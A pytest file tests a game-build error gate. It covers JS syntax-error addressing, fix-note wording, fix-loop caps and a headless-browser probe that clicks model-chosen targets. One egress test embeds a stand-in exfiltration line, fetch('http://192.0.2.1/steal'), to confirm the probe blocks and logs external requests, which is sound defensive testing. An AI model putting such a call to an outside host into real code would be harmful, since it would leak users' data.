import json
from pathlib import Path

import pytest

import sys
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from maestro.codegen import error_gate


def _game(tmp_path: Path, index: str, **files: str) -> Path:
    gdir = tmp_path / "game"
    gdir.mkdir()
    (gdir / "index.html").write_text(index)
    for name, body in files.items():
        (gdir / name).write_text(body)
    return gdir


# ---------------------------------------------------------------- addresses

def test_parse_address_names_file_and_line(tmp_path):
    gdir = _game(tmp_path, "<html><body></body></html>",
                 **{"game.js": "const a = [1, 2,\nfunction broken( {\n"})
    lines = error_gate._parse_addresses(gdir)
    assert len(lines) == 1
    assert lines[0].startswith("game.js:")


def test_parse_address_reads_inline_scripts(tmp_path):
    gdir = _game(tmp_path, "<html><script>\nlet x = {,};\n</script></html>")
    lines = error_gate._parse_addresses(gdir)
    assert len(lines) == 1
    assert lines[0].startswith("index.html inline script #1")


def test_valid_module_syntax_is_not_flagged(tmp_path):
    gdir = _game(tmp_path, "<html></html>",
                 **{"main.js": "import * as THREE from './three.module.js';\nexport const ok = 1;\n"})
    assert error_gate._parse_addresses(gdir) == []


def test_vendored_files_are_not_checked(tmp_path):
    gdir = _game(tmp_path, "<html></html>",
                 **{"three.module.js": "this is not javascript at all {{{"})
    assert error_gate._parse_addresses(gdir) == []


def test_redeclaration_scan_lists_every_site(tmp_path):
    gdir = _game(tmp_path, "<html></html>",
                 **{"a.js": "const tabW = 1;\n", "b.js": "let y = 2;\nconst tabW = 3;\n"})
    sites = error_gate._declaration_sites("tabW", gdir)
    assert any(s.startswith("a.js:1") for s in sites)
    assert any(s.startswith("b.js:2") for s in sites)


# ---------------------------------------------------------------- the note

def test_note_carries_message_address_and_parse_sentence(tmp_path):
    gdir = _game(tmp_path, "<html></html>", **{"game.js": "const q = [1,\n"})
    note = error_gate.note_for({"message": "SyntaxError: missing ] after element list",
                                "stack": ""}, gdir)
    assert "missing ] after element list" in note
    assert "game.js:" in note
    assert "every occurrence" in note


def test_runtime_note_uses_stack_and_skips_parse_sentence(tmp_path):
    gdir = _game(tmp_path, "<html></html>")
    note = error_gate.note_for(
        {"message": "TypeError: this._doIdle is not a function",
         "stack": "TypeError: this._doIdle is not a function\n    at gameLoop (game.js:769)"},
        gdir)
    assert "game.js:769" in note
    assert "every occurrence" not in note


# ---------------------------------------------------------------- loop control

class _Kickoffs:
    def __init__(self):
        self.calls = []
        self.refuse = False

    def __call__(self, run_id, *, kind, note, after):
        self.calls.append({"run_id": run_id, "kind": kind, "note": note, "after": after})
        return None if self.refuse else "f1"


@pytest.fixture
def wired(tmp_path, monkeypatch):
    run_dir = tmp_path / "run"
    gdir = run_dir / "game"
    gdir.mkdir(parents=True)
    (gdir / "index.html").write_text("<html></html>")

    kickoffs = _Kickoffs()

    class FakeRS:
        def __init__(self, run_id):
            self.run_dir = run_dir

    import maestro.codegen.build_chain as build_chain
    import maestro.state
    monkeypatch.setattr(build_chain, "kickoff", kickoffs)
    monkeypatch.setattr(maestro.state, "RunState", FakeRS)
    return run_dir, gdir, kickoffs


def test_thrown_error_enters_fix_machine_with_one_note(wired, monkeypatch):
    run_dir, gdir, kickoffs = wired
    monkeypatch.setattr(error_gate, "probe", lambda g: [
        {"message": "ReferenceError: Game is not defined", "stack": "at onclick (index.html:1)"},
        {"message": "TypeError: also broken", "stack": ""}])
    error_gate.after_build("r1", "b1")
    assert len(kickoffs.calls) == 1
    assert (kickoffs.calls[0]["kind"], kickoffs.calls[0]["after"]) == ("fix", "b1")
    assert "Game is not defined" in kickoffs.calls[0]["note"]
    assert "also broken" not in kickoffs.calls[0]["note"]
    assert json.loads((run_dir / "error_gate.json").read_text())["rounds"] == 1


def test_clean_probe_kicks_nothing(wired, monkeypatch):
    run_dir, gdir, kickoffs = wired
    monkeypatch.setattr(error_gate, "probe", lambda g: [])
    error_gate.after_build("r1", "b1")
    assert kickoffs.calls == []


def test_a_fix_the_game_refuses_is_not_reported_as_started(wired, monkeypatch):
    run_dir, gdir, kickoffs = wired
    kickoffs.refuse = True
    monkeypatch.setattr(error_gate, "probe", lambda g: [{"message": "TypeError: x", "stack": ""}])
    assert error_gate.after_build("r1", "b1") is False
    assert len(kickoffs.calls) == 1


def test_same_error_twice_running_stops(wired, monkeypatch):
    run_dir, gdir, kickoffs = wired
    err = [{"message": "TypeError: stuck", "stack": ""}]
    monkeypatch.setattr(error_gate, "probe", lambda g: err)
    error_gate.after_build("r1", "b1")
    error_gate.after_build("r1", "b1")
    assert len(kickoffs.calls) == 1


def test_round_cap_stops(wired, monkeypatch):
    run_dir, gdir, kickoffs = wired
    n = [0]

    def churn(g):
        n[0] += 1
        return [{"message": f"TypeError: bug {n[0]}", "stack": ""}]

    monkeypatch.setattr(error_gate, "probe", churn)
    for _ in range(error_gate.MAX_ROUNDS + 3):
        error_gate.after_build("r1", "b1")
    assert len(kickoffs.calls) == error_gate.MAX_ROUNDS


# ---------------------------------------------------------------- the real probe

@pytest.fixture
def fast_probe(monkeypatch):
    """The settle after each load and press is PROBE_SECONDS/2; a test page throws on boot or on
    the press itself, so the production 6s (21s per fixed poke) buys nothing here."""
    monkeypatch.setattr(error_gate, "PROBE_SECONDS", 0.4)

@pytest.fixture
def no_model(monkeypatch, fast_probe):
    """The fixed poke: no model to ask where to press."""
    monkeypatch.setattr(error_gate, "_targets", lambda png: None)

@pytest.mark.parametrize("body,expect", [
    ("<html><body><script>\nundefinedFunction();\n</script></body></html>", 1),
    ("<html><body><script>\ndocument.title = 'fine';\n</script></body></html>", 0),
])
@pytest.mark.browser
def test_headless_probe_hears_boot_errors(tmp_path, body, expect, no_model):
    pytest.importorskip("playwright.sync_api")
    gdir = _game(tmp_path, body)
    errors = error_gate.probe(gdir)
    assert len(errors) == expect
    if expect:
        assert "undefinedFunction" in errors[0]["message"]


@pytest.mark.browser
def test_probe_hears_a_module_the_page_asked_for_and_did_not_get(tmp_path, no_model):
    """A module import that 404s stops the whole graph without throwing — a game that never ran
    a line read clean until the probe listened for the failed fetch."""
    pytest.importorskip("playwright.sync_api")
    gdir = _game(tmp_path, "<html><body><script type=module src='js/main.js'></script></body></html>")
    (gdir / "js").mkdir()
    (gdir / "js" / "main.js").write_text("import { keys } from './lib/input.js';\nkeys.up;\n")
    errors = error_gate.probe(gdir)
    assert len(errors) == 1
    assert "js/lib/input.js" in errors[0]["message"] and "does not exist" in errors[0]["message"]


@pytest.mark.browser
def test_probe_clicks_the_viewport_centre_without_a_model(tmp_path, no_model):
    """The fixed poke, when the model cannot be asked: a canvas-drawn PLAY at the centre."""
    pytest.importorskip("playwright.sync_api")
    gdir = _game(tmp_path, "<html><body><script>\n"
                 "addEventListener('click', e => { const w = innerWidth, h = innerHeight;\n"
                 "  if (Math.abs(e.clientX - w/2) < 5 && Math.abs(e.clientY - h/2) < 5) startTurn(); });\n"
                 "</script></body></html>")
    errors = error_gate.probe(gdir)
    assert len(errors) == 1 and "startTurn" in errors[0]["message"]


@pytest.mark.browser
def test_probe_blocks_external_egress_and_logs_it(tmp_path, caplog, monkeypatch, no_model):
    """The probe runs the game's own JS on the control-plane box — a request to anything but the
    game's ephemeral server must die inside the browser."""
    import logging
    pytest.importorskip("playwright.sync_api")
    monkeypatch.setattr(error_gate, "PROBE_SECONDS", 0.4)
    gdir = _game(tmp_path, "<html><body><script>\n"
                           "fetch('http://192.0.2.1/steal').catch(() => {});\n"
                           "</script></body></html>")
    with caplog.at_level(logging.WARNING):
        errors = error_gate.probe(gdir)
    assert errors == []
    assert any("blocked" in r.getMessage() and "192.0.2.1" in r.getMessage()
               for r in caplog.records)


@pytest.mark.browser
def test_probe_still_serves_the_games_own_files(tmp_path, caplog, monkeypatch, no_model):
    import logging
    pytest.importorskip("playwright.sync_api")
    monkeypatch.setattr(error_gate, "PROBE_SECONDS", 0.4)
    gdir = _game(tmp_path, "<html><body><script>\n"
                           "fetch('data.json').then(r => {\n"
                           "  if (!r.ok) throw new Error('local fetch failed');\n"
                           "});\n"
                           "</script></body></html>")
    (gdir / "data.json").write_text("{}")
    with caplog.at_level(logging.WARNING):
        errors = error_gate.probe(gdir)
    assert errors == []
    assert not any("blocked" in r.getMessage() for r in caplog.records)


def test_parse_address_finds_files_in_subfolders_and_skips_lib(tmp_path):
    gdir = _game(tmp_path, "<html></html>")
    (gdir / "game").mkdir()
    (gdir / "game" / "data.js").write_text("export const a = 'Hesper's letter';\n")
    (gdir / "lib").mkdir()
    (gdir / "lib" / "input.js").write_text("this is not javascript\n")
    lines = error_gate._parse_addresses(gdir)
    assert len(lines) == 1
    assert lines[0].startswith("game/data.js:")


def test_bare_browser_syntax_message_gets_the_parse_sentence(tmp_path):
    gdir = _game(tmp_path, "<html></html>", **{"a.js": "export const a = 'it's';\n"})
    note = error_gate.note_for({"message": "Unexpected identifier 's'", "stack": ""}, gdir)
    assert "a.js: 1" in note and "every occurrence" in note


# ---------------------------------------------------------------- where to press

def test_parse_targets_reads_fenced_json_clamps_and_names_keys():
    text = ('```json\n{"targets": [{"label": "PLAY", "x": 550, "y": 396}, {"label": "off", "x": 5000, "y": 1},'
            ' {"label": "bad", "x": "no"}], "keys": ["Esc", "space", "d", "Left arrow", ""]}\n```')
    assert error_gate._parse_targets(text) == [
        ("click", (550, 396)), ("key", "Escape"), ("key", "Space"), ("key", "d"), ("key", "ArrowLeft")]


def test_parse_targets_caps_each_kind():
    data = {"targets": [{"label": str(i), "x": i, "y": i} for i in range(20)],
            "keys": [chr(65 + i) for i in range(20)]}
    actions = error_gate._parse_targets(json.dumps(data))
    assert len([a for a in actions if a[0] == "click"]) == error_gate.MAX_TARGETS
    assert len([a for a in actions if a[0] == "key"]) == error_gate.MAX_TARGETS


@pytest.mark.parametrize("text", ["", "not json", "[1, 2]", "```\n{\n```"])
def test_parse_targets_answers_none_off_shape(text):
    assert error_gate._parse_targets(text) is None


@pytest.mark.browser
def test_probe_presses_what_the_model_names(tmp_path, monkeypatch, fast_probe):
    """Two builds died on a PLAY button that was not at the viewport centre; the fixed poke never
    reached it. The model reads the screenshot and names the button, and the probe presses THAT."""
    pytest.importorskip("playwright.sync_api")
    gdir = _game(tmp_path, "<html><body><script>\n"
                 "addEventListener('click', e => { if (Math.abs(e.clientX - 550) < 5 && Math.abs(e.clientY - 396) < 5) startCase(); });\n"
                 "addEventListener('keydown', e => { if (e.key === 'h') openHelp(); });\n"
                 "</script></body></html>")
    seen = {}
    def fake_targets(png):
        seen["png"] = png
        return [("click", (550, 396)), ("key", "h")]
    monkeypatch.setattr(error_gate, "_targets", fake_targets)
    errors = error_gate.probe(gdir)
    assert seen["png"][:8] == b"\x89PNG\r\n\x1a\n"
    assert [e["message"].split(":")[-1].strip() for e in errors] == \
        ["startCase is not defined", "openHelp is not defined"]


@pytest.mark.browser
def test_probe_presses_each_on_a_fresh_page(tmp_path, monkeypatch, fast_probe):
    """A title that leaves on the first press would hide what the later ones do."""
    pytest.importorskip("playwright.sync_api")
    gdir = _game(tmp_path, "<html><body><script>\n"
                 "let gone = false;\n"
                 "addEventListener('keydown', e => { if (gone) return; gone = true; if (e.key === 'Enter') a(); if (e.key === ' ') b(); });\n"
                 "</script></body></html>")
    monkeypatch.setattr(error_gate, "_targets", lambda png: [("key", "Enter"), ("key", "Space")])
    errors = error_gate.probe(gdir)
    assert sorted(e["message"].split(":")[-1].strip() for e in errors) == ["a is not defined", "b is not defined"]


def test_probe_asks_with_the_screenshot_and_the_prompt(monkeypatch):
    calls = {}
    class FakeConn:
        def generate_with_tools(self, messages, tools, max_tokens=None, reasoning=None):
            calls["messages"] = messages
            return {"choices": [{"message": {"content": '{"targets": [{"label": "GO", "x": 1, "y": 2}], "keys": []}'}}]}
    monkeypatch.setattr(error_gate, "get_connector", lambda: FakeConn())
    assert error_gate._targets(b"\x89PNG fake") == [("click", (1, 2))]
    user = calls["messages"][-1]["content"]
    assert user[0]["type"] == "text" and "1280 by 720" in user[0]["text"]
    assert user[1]["image_url"]["url"].startswith("data:image/png;base64,")


def test_probe_falls_back_to_the_fixed_poke_when_the_model_cannot_be_asked(monkeypatch):
    class DeadConn:
        def generate_with_tools(self, *a, **k):
            raise RuntimeError("no worker")
    monkeypatch.setattr(error_gate, "get_connector", lambda: DeadConn())
    assert error_gate._targets(b"\x89PNG fake") is None
